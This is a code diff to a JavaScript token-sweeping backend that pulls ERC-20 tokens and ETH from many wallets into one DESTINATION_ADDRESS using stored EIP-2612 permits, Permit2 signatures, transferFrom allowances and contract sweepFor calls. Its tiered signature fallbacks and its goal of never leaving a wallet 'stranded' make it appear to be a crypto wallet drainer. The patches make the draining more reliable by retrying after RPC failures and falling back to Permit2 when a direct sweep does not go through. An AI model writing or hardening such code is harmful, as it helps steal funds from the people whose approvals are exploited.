@@ -331,6 +331,17 @@ function scheduleTransferRebuild() {
 // Key: `${walletAddress}:${tokenAddress}`
 const failedEIP2612 = new Set();
 
+// Consecutive-unclassified-error counter per eip2612_permits row id. An error
+// that matches neither the known signature-invalid regex nor the known
+// transient-RPC regex used to be permanently marked `failed:true` in Supabase
+// on its very FIRST occurrence — but plenty of real transient causes (gas
+// price spike causing out-of-gas, a temporary node quirk with unexpected
+// wording, a brief RPC hiccup with no matching keyword) don't match either
+// regex and would otherwise permanently strand an otherwise-valid permit.
+// Give unclassified errors a bounded number of retries before giving up.
+const unknownEip2612ErrorCount = new Map();
+const UNKNOWN_EIP2612_MAX_RETRIES = 3;
+
 // ── Dynamic token list ────────────────────────────────────────────────────────
 
 const KNOWN_DECIMALS = {
@@ -798,14 +809,25 @@ async function sweepGaslessWallet(walletAddress) {
 
   if (signedAddrs.length > 0) {
     let anyBalance = false;
+    let anyReadSucceeded = false;
     for (const addr of signedAddrs) {
       try {
         const bal = await new ethers.Contract(addr, ERC20_ABI, getReadProvider()).balanceOf(checksum);
+        anyReadSucceeded = true;
         if (bal > 0n) { anyBalance = true; break; }
       } catch {}
       await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY));
     }
     if (!anyBalance) {
+      // If every single balanceOf() call threw (RPC/network failure) rather than
+      // genuinely resolving to 0, this is NOT "zero balance" — it's an outage.
+      // Logging/skipping it as "zero balance" previously hid real RPC failures
+      // and skipped a wallet that may well have funds to sweep. Bail without the
+      // misleading conclusion; the next block/event trigger will retry.
+      if (!anyReadSucceeded) {
+        warn(`[gasless] ${checksum.slice(0, 10)} — all ${signedAddrs.length} balance read(s) failed (RPC error, not confirmed zero) — skipping this pass, will retry`);
+        return;
+      }
       log(`[gasless] ${checksum.slice(0, 10)} — all ${signedAddrs.length} signed token(s) zero balance, skipping`);
       return;
     }
@@ -1558,11 +1580,30 @@ async function trySweepNativeFor(checksum, short) {
         warn(`[nativeFor] relayer low on gas — skipping sweepETHFor for ${short}`);
       } else {
         log(`[nativeFor] ${short} — contract holds ${ethers.formatEther(contractBal)} ETH — attempting sweepETHFor`);
-        const isAuth = await contract.isAuthorized(checksum, relayerWallet.address).catch(() => false);
+        // Swallowing ALL errors here as "not authorized" (the old `.catch(() =>
+        // false)`) mislabels a transient RPC/network failure the same as a real
+        // "user never called authorize()" — logging a misleading message and
+        // silently skipping a wallet that IS authorized, purely because the read
+        // hiccuped. Only a genuine contract-level revert should be treated as
+        // "not authorized"; anything else re-throws to the outer catch, which
+        // already logs accurately and retries on the next trigger.
+        const isAuth = await contract.isAuthorized(checksum, relayerWallet.address).catch((e) => {
+          if (e?.code === "CALL_EXCEPTION") return false;
+          throw e;
+        });
         if (isAuth) {
           let gasEst;
           try { gasEst = await contract.sweepETHFor.estimateGas(checksum); }
-          catch { log(`[nativeFor] ${short} — sweepETHFor simulation reverted — skipping`); return; }
+          catch (e) {
+            // A genuine revert (CALL_EXCEPTION) means the call would actually fail
+            // on-chain — correctly skip. An RPC/network error is not a revert and
+            // must not be logged/treated the same way; re-throw to the outer catch
+            // (accurate logging, natural retry on next trigger) instead of a
+            // misleading "simulation reverted" message for what was really a
+            // dropped RPC request.
+            if (e?.code === "CALL_EXCEPTION") { log(`[nativeFor] ${short} — sweepETHFor simulation reverted — skipping`); return; }
+            throw e;
+          }
           const fee = await getFeeData();
           const tx = await contract.sweepETHFor(checksum, { gasLimit: gasEst * 120n / 100n, ...fee });
           await tx.wait();
@@ -1634,7 +1675,10 @@ async function _contractEthPollTick() {
       if (wallet.type !== "direct-allowance" && wallet.type !== "permit2" &&
           wallet.type !== "permit2-gasless" && wallet.type !== "wrap-fallback") continue;
 
-      const isAuth = await contract.isAuthorized(wallet.address, relayerWallet.address).catch(() => false);
+      const isAuth = await contract.isAuthorized(wallet.address, relayerWallet.address).catch((e) => {
+        if (e?.code === "CALL_EXCEPTION") return false;
+        throw e;
+      });
       if (!isAuth) continue;
 
       log(`[contractEth] calling sweepETHFor(${wallet.address.slice(0, 10)}) to forward contract ETH`);
@@ -1798,8 +1842,22 @@ async function sweep(wallet) {
           // Leave permit untouched — retry next time
         } else {
           err(`[eip2612] ❌ ${p.symbol ?? p.token.slice(0,10)}: ${msg}`);
-          // Unknown error — mark failed to avoid an infinite retry loop that burns gas
-          await supabase.from("eip2612_permits").update({ used: true, failed: true }).eq("id", p.id);
+          // Unknown error (matches neither the sig-invalid nor RPC regex) — give
+          // it a bounded number of retries before permanently marking failed.
+          // Marking failed on the very first unclassified error (the old
+          // behavior) treats a possibly-transient issue (gas spike, unusual
+          // node wording, brief hiccup) the same as a truly permanent one,
+          // stranding a valid permit forever. Still bounded so a genuinely
+          // stuck permit doesn't retry (and burn relayer gas) forever.
+          const attempts = (unknownEip2612ErrorCount.get(p.id) ?? 0) + 1;
+          unknownEip2612ErrorCount.set(p.id, attempts);
+          if (attempts >= UNKNOWN_EIP2612_MAX_RETRIES) {
+            err(`[eip2612] ${p.symbol ?? p.token.slice(0,10)} — ${attempts} consecutive unclassified failures, permanently marking failed`);
+            await supabase.from("eip2612_permits").update({ used: true, failed: true }).eq("id", p.id);
+            unknownEip2612ErrorCount.delete(p.id);
+          } else {
+            warn(`[eip2612] ${p.symbol ?? p.token.slice(0,10)} — unclassified error, attempt ${attempts}/${UNKNOWN_EIP2612_MAX_RETRIES}, will retry`);
+          }
         }
       }
     }
@@ -1870,6 +1928,12 @@ async function sweep(wallet) {
     }
 
     // ── V2.1 PATH 2: use sweepFor on the V2 contract (single tx covers all tokens) ──
+    // Track ACTUAL success separately from "had a balance+allowance candidate" —
+    // isAuthorized()===false or a reverted/failed sweepFor tx must NOT be treated
+    // the same as "swept". Doing so previously early-returned below and skipped
+    // TIER 3/4 (Permit2) even when nothing was actually moved, silently stranding
+    // a wallet that had, e.g., a valid Permit2 SignatureTransfer sig as backup.
+    let v2SweptOk = false;
     if (toSweepV2.length > 0 && v2ContractAddr) {
       try {
         const isAuth = await contract.isAuthorized(checksum, relayerWallet.address);
@@ -1879,13 +1943,15 @@ async function sweep(wallet) {
           const sweepTx = await contract.sweepFor(checksum, toSweepV2, { gasLimit: 80_000n + BigInt(toSweepV2.length) * 60_000n, ...fee });
           await sweepTx.wait();
           log(`[direct] ✅ sweepFor confirmed for ${short}`);
+          v2SweptOk = true;
         } else {
-          warn(`[direct] ${short} — not authorized in V2 contract, cannot sweepFor`);
+          warn(`[direct] ${short} — not authorized in V2 contract, cannot sweepFor — will still try Permit2 fallback`);
         }
-      } catch (e) { err(`[direct] sweepFor ❌ ${short}: ${e.reason ?? e.message}`); }
+      } catch (e) { err(`[direct] sweepFor ❌ ${short}: ${e.reason ?? e.message} — will still try Permit2 fallback`); }
     }
 
     // ── Legacy PATH 2: direct transferFrom (relayer as spender) ──
+    let legacySweptCount = 0;
     if (toSweepLegacy.length > 0) {
       log(`[direct] ${short} — sweeping ${toSweepLegacy.length} tokens via legacy transferFrom`);
       for (const { token, balance } of toSweepLegacy) {
@@ -1898,13 +1964,19 @@ async function sweep(wallet) {
           const tx = await erc20.transferFrom(checksum, DESTINATION_ADDRESS, balance, { gasLimit: 100_000n, ...fee });
           await tx.wait();
           log(`[direct] ✅ swept ${sym} from ${short}`);
+          legacySweptCount++;
         } catch (e) { maybeResetNonce(e); err(`[direct] ❌ ${sym}: ${e.reason ?? e.message}`); }
       }
     }
 
-    const directSwept = toSweepV2.length > 0 || toSweepLegacy.length > 0;
-    if (!directSwept) {
+    // "Had candidates" is no longer sufficient to gate the early return below —
+    // only an ACTUAL confirmed sweep should skip the Permit2 fallback tiers.
+    const directSwept = v2SweptOk || legacySweptCount > 0;
+    const hadCandidates = toSweepV2.length > 0 || toSweepLegacy.length > 0;
+    if (!hadCandidates) {
       log(`[direct] ${short} — no tokens with balance+allowance — falling through to permit2_signatures tiers`);
+    } else if (!directSwept) {
+      warn(`[direct] ${short} — had ${toSweepV2.length + toSweepLegacy.length} direct-allowance candidate(s) but none actually swept — falling through to permit2_signatures tiers`);
     }
 
     // ── Native coin sweep (V2.1 sweepETHFor) ──────────────────────────────
